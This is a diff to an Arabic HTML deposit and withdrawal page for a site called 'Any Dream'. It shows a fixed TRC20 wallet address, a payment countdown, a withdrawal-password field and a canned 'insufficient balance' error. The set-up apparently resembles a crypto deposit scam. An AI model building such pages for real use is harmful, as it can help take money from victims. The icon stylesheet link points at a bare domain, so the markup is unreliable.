@@ -5,7 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Any Dream</title>
   <link rel="stylesheet" href="home.css">
-  <!-- مكتبة الأيقونات الاحترافية الأساسية المفقودة -->
+  <!-- استدعاء المكتبة الاحترافية للأيقونات بشكل كامل -->
   <link rel="stylesheet" href="https://cloudflare.com">
 </head>
 <body>
@@ -29,7 +29,7 @@
       <p>يمكنك الشحن من خارج منصات التداول عبر OKX أو Binance</p>
     </div>
     
-    <!-- شريط تحميل اللودينغ -->
+    <!-- شريط تحميل اللودينغ التنازلي -->
     <div class="deposit-loading-bar">
       <div class="loading-progress"></div>
     </div>
@@ -39,7 +39,7 @@
       <i class="far fa-clock"></i> ينتهي طلب الدفع خلال: <span id="timer">45:00</span>
     </div>
 
-    <!-- عنوان المحفظة -->
+    <!-- عنوان المحفظة كامل وبدون تقطيع -->
     <div class="address-display-box">
       <span class="address-title">عنوان المحفظة (TRC20):</span>
       <div class="crypto-address" id="walletAddrText">THJN4XBKxbZNYsw7YAHmNiZSupn3kVEDFP</div>
@@ -66,7 +66,7 @@
       <input type="password" class="styled-input" id="fundPassword" placeholder="أدخل كلمة مرور السحب" required>
     </div>
 
-    <!-- رسالة رصيد غير كافٍ -->
+    <!-- رسالة الخطأ المحمية -->
     <div id="errorMessage" class="error-toast-message">
       <i class="fas fa-exclamation-circle"></i> عذراً، رصيدك الحالي غير كافٍ لإتمام عملية السحب.
     </div>
@@ -75,21 +75,21 @@
   </form>
 </div>
 
-<!-- شريط التنقل السفلي الأصلي الموحد والدائري المعدل ليرتبط بالملفات القادمة -->
+<!-- شريط التنقل السفلي الأصلي الموحد والدائري والمصلح بالأيقونات الحديثة -->
 <div class="main-bottom-nav">
-  <a href="account.html" class="nav-btn-item">
+  <a href="account.html">
     <i class="fas fa-user"></i>
     <span>حسابي</span>
   </a>
-  <a href="tasks.html" class="nav-btn-item">
+  <a href="tasks.html">
     <i class="fas fa-list-check"></i>
     <span>المهام</span>
   </a>
-  <a href="assets.html" class="nav-btn-item">
+  <a href="assets.html">
     <i class="fas fa-wallet"></i>
     <span>الأصول</span>
   </a>
-  <a href="home.html" class="nav-btn-item current-active">
+  <a href="home.html" class="current-active">
     <div class="home-icon-circle">
       <i class="fas fa-house"></i>
     </div>
@@ -97,6 +97,7 @@
   </a>
 </div>
 
+<!-- كود العداد والتحقق والنسخ -->
 <script>
 let timerInterval;
 
